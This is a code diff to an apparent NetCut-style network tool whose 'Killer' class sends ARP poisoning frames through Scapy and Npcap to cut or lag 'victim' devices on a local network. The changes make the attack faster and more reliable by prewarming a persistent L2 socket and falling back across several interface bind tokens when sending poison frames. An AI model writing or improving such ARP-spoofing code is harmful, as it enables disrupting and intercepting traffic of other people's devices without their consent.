@@ -137,6 +137,7 @@ class Killer:
         self.forwarders = {}
         self.pf_blocks = set()
         self._socket = None  # Persistent L2 socket
+        self._socket_token: str | None = None  # Npcap bind token that opened _socket
         self._op_seq = {}  # MAC -> operation generation to cancel stale workers
 
     def _next_op_seq(self, mac):
@@ -144,15 +145,73 @@ class Killer:
         self._op_seq[mac] = seq
         return seq
     
+    def _iface_l2_tokens(self) -> list[str]:
+        if not self.iface or getattr(self.iface, 'name', None) in (None, '', 'NULL'):
+            return []
+        return npcap_iface_tokens(self.iface)
+
+    def l2_socket_ready(self) -> bool:
+        """True when the cached Npcap L2 socket is open for the current adapter."""
+        sock = self._socket
+        if sock is None:
+            return False
+        try:
+            return not getattr(sock, 'closed', False)
+        except Exception:
+            return True
+
+    def prewarm_l2_socket(self, *, join_ms: int = 0) -> bool:
+        """
+        Open/cache the Npcap L2 socket before the first Kill/Lag click.
+
+        ``join_ms`` > 0 blocks up to that many ms (instant-cut path uses ~120ms).
+        """
+        if self.l2_socket_ready():
+            return True
+        if join_ms > 0:
+            holder = {'ok': False}
+
+            def _work() -> None:
+                holder['ok'] = self._get_socket() is not None
+
+            th = threading.Thread(
+                target=safe_daemon_target(_work),
+                name='zubcut-npcap-prewarm-sync',
+                daemon=True,
+            )
+            th.start()
+            th.join(max(0, int(join_ms)) / 1000.0)
+            return bool(holder['ok'])
+        try:
+            threading.Thread(
+                target=safe_daemon_target(self._get_socket),
+                name='zubcut-npcap-prewarm',
+                daemon=True,
+            ).start()
+        except Exception:
+            pass
+        return self.l2_socket_ready()
+
     def _get_socket(self):
-        """Get or create persistent L2 socket - prevents Windows socket exhaustion"""
-        if self._socket is None:
+        """Get or create persistent L2 socket — tries all Npcap bind tokens (GUID + name)."""
+        if self.l2_socket_ready():
+            return self._socket
+        self._socket = None
+        self._socket_token = None
+        for tok in self._iface_l2_tokens():
             try:
-                iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
-                self._socket = conf.L2socket(iface=iface)
+                self._socket = conf.L2socket(iface=tok)
+                self._socket_token = tok
+                try:
+                    conf.iface = tok
+                except Exception:
+                    pass
+                return self._socket
             except Exception:
                 self._socket = None
-        return self._socket
+                self._socket_token = None
+                continue
+        return None
     
     def _send_packet(self, packet):
         """Send packet using persistent socket, fallback to new socket if needed"""
@@ -165,11 +224,16 @@ class Killer:
                 # Socket died, recreate
                 self._close_socket()
         
-        # Fallback: direct send (creates new socket)
+        # Fallback: direct send (creates new socket) — try every Npcap token.
         try:
             from scapy.all import sendp
-            iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
-            sendp(packet, iface=iface, verbose=0)
+
+            for tok in self._iface_l2_tokens():
+                try:
+                    sendp(packet, iface=tok, verbose=0)
+                    return
+                except Exception:
+                    continue
         except Exception:
             pass
     
@@ -181,6 +245,7 @@ class Killer:
             except Exception:
                 pass
             self._socket = None
+        self._socket_token = None
 
     def _sync_iface_for_victim(self, victim, *, refresh_router=True):
         """
@@ -450,9 +515,11 @@ class Killer:
             return
         sock = self._socket
         if sock is None:
-            # Cold Npcap socket: open off-thread so GUI never blocks, but still
-            # fire poison immediately (Driver Easy / first Lag ON used to wait
-            # until the ARP worker's first _get_socket() finished).
+            # Cold Npcap socket: race a short blocking prewarm so poison can go sync.
+            if self.prewarm_l2_socket(join_ms=120):
+                sock = self._socket
+        if sock is None:
+            # Still cold — background burst + socket warm for the ARP worker.
             self._poison_arp_now_async(victim, seq, repeats, delay_s)
             return
         frames = self._poison_frames(victim)
@@ -477,15 +544,24 @@ class Killer:
             try:
                 from scapy.all import sendp
 
-                iface = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
-                if not iface or iface == 'NULL':
+                tokens = self._iface_l2_tokens()
+                if not tokens:
                     return
                 frames = self._poison_frames(victim)
                 for _ in range(max(1, int(repeats))):
                     if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                         break
-                    for frame in frames:
-                        sendp(frame, iface=iface, verbose=0)
+                    sent = False
+                    for tok in tokens:
+                        try:
+                            for frame in frames:
+                                sendp(frame, iface=tok, verbose=0)
+                            sent = True
+                            break
+                        except Exception:
+                            continue
+                    if not sent:
+                        break
                     if delay_s > 0:
                         sleep(delay_s)
                 # Warm the persistent socket for the worker loop.
